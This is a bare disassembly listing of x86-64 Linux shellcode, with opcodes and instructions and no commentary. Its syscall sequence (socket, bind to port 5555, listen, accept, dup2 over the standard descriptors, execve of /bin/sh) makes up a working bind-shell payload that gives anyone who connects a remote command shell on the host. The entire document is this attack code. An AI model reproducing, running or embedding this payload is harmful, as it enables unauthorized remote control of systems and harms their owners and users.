00000000  6A29              push byte +0x29
00000002  58                pop rax
00000003  99                cdq
00000004  6A02              push byte +0x2
00000006  5F                pop rdi
00000007  6A01              push byte +0x1
00000009  5E                pop rsi
0000000A  0F05              syscall
0000000C  4897              xchg rax,rdi
0000000E  52                push rdx
0000000F  C70424020015B3    mov dword [rsp],0xb3150002
00000016  4889E6            mov rsi,rsp
00000019  6A10              push byte +0x10
0000001B  5A                pop rdx
0000001C  6A31              push byte +0x31
0000001E  58                pop rax
0000001F  0F05              syscall
00000021  6A32              push byte +0x32
00000023  58                pop rax
00000024  0F05              syscall
00000026  4831F6            xor rsi,rsi
00000029  6A2B              push byte +0x2b
0000002B  58                pop rax
0000002C  0F05              syscall
0000002E  4897              xchg rax,rdi
00000030  6A03              push byte +0x3
00000032  5E                pop rsi
00000033  48FFCE            dec rsi
00000036  6A21              push byte +0x21
00000038  58                pop rax
00000039  0F05              syscall
0000003B  75F6              jnz 0x33
0000003D  6A3B              push byte +0x3b
0000003F  58                pop rax
00000040  99                cdq
00000041  48BB2F62696E2F73  mov rbx,0x68732f6e69622f
         -6800
0000004B  53                push rbx
0000004C  4889E7            mov rdi,rsp
0000004F  52                push rdx
00000050  57                push rdi
00000051  4889E6            mov rsi,rsp
00000054  0F05              syscall
